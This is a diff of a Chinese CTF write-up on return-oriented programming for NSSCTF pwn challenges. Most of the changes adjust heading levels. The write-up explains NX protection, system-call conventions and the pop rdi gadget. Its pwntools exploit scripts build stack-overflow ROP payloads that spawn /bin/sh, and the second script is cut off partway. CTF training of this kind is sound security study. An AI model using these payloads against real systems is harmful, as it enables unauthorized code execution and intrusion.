@@ -11,11 +11,11 @@ recommend: 10
 
 
 
-# PWN-ROP
+## PWN-ROP
 
 ---
 
-## 什么是ROP
+### 什么是ROP
 
 > **为什么会诞生 ROP？（被逼出来的绝招）**
 >
@@ -48,7 +48,7 @@ recommend: 10
 
 ---
 
-## 4.2.1 [NISACTF 2022]ezstack
+### 4.2.1 [NISACTF 2022]ezstack
 
 比赛链接：https://www.nssctf.cn/problem/2057
 
@@ -58,7 +58,7 @@ recommend: 10
 
 ---
 
-### NX保护
+#### NX保护
 
 > **NX 保护 (No-eXecute)**
 > NX（在 Windows 中称为 DEP）针对的是**内存权限**。
@@ -83,7 +83,7 @@ payload = b'a'*72 + p32(system_addr)+p32(bin_addr)
 
 ---
 
-### 32位系统下对system函数调用的不同区别
+#### 32位系统下对system函数调用的不同区别
 
 动画:[HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/[NISACTF 2022\]ezstack/p32位系统system_call不同区别payload不同用法.html · 工程部Teddy Bear/网络安全 - 码云 - 开源中国](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/[NISACTF 2022]ezstack/p32位系统system_call不同区别payload不同用法.html)
 
@@ -107,27 +107,27 @@ payload = b'a'*72 + p32(system_addr)+p32(bin_addr)
 
 ---
 
-### Exploit 代码
+#### Exploit 代码
 
 ```python
 from pwn import *
 r = process("./pwn")
-#r = remote("node5.anna.nssctf.cn",21304)
+##r = remote("node5.anna.nssctf.cn",21304)
 context(os='linux',arch='i386',log_level='debug')
 offset = 0x48+0x4
-#return_address = 0x08048503
+##return_address = 0x08048503
 system_address = 0x08048512
 bin_sh_address = 0x0804A024
 
 payload = b'a'*offset+p32(system_address)+p32(bin_sh_address)
-#gdb.attach(r)
+##gdb.attach(r)
 r.sendline(payload)
 r.interactive()
 ```
 
 ---
 
-## 4.2.2 [GFCTF 2021]where_is_shell
+### 4.2.2 [GFCTF 2021]where_is_shell
 
 题目连接:https://www.nssctf.cn/problem/889
 
@@ -147,7 +147,7 @@ r.interactive()
 
 ---
 
-### 垫片ret
+#### 垫片ret
 
 [栈对齐动画](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/[SWPUCTF 2021 新生赛]gift_pwn/PWN 栈对齐.html)
 
@@ -156,7 +156,7 @@ r.interactive()
 
 ---
 
-### 不同system_call的区别(64位)
+#### 不同system_call的区别(64位)
 
 - **形态一：跳向代码段的 `call _system`**
   - 底层原理：`call` 指令硬件级微操是 `push rip; jmp`。
@@ -174,7 +174,7 @@ r.interactive()
 
 ---
 
-### `$0` 的妙用
+#### `$0` 的妙用
 
 还记得这张图片吗？
 ![image-20260429130046386](https://img2024.cnblogs.com/blog/3726946/202604/3726946-20260429185018129-1407487080.png)
@@ -186,7 +186,7 @@ r.interactive()
 
 ---
 
-### pop rdi;ret 作用
+#### pop rdi;ret 作用
 
 > **64位传参约定：**
 > 函数不再从栈上找参数，而是看寄存器。第一个参数必须放在 **`rdi`**。
@@ -198,14 +198,14 @@ r.interactive()
 
 ---
 
-### Exploit 代码
+#### Exploit 代码
 
 ```python
-# call _system 方式
+## call _system 方式
 from pwn import *
 context(os = 'linux', arch = 'amd64', log_level = 'debug')
 
-#r = process('./shell')
+##r = process('./shell')
 r = remote("node4.anna.nssctf.cn", 25607) 
 offset = 0x10+0x8
 pop_rdi_ret = 0x4005e3
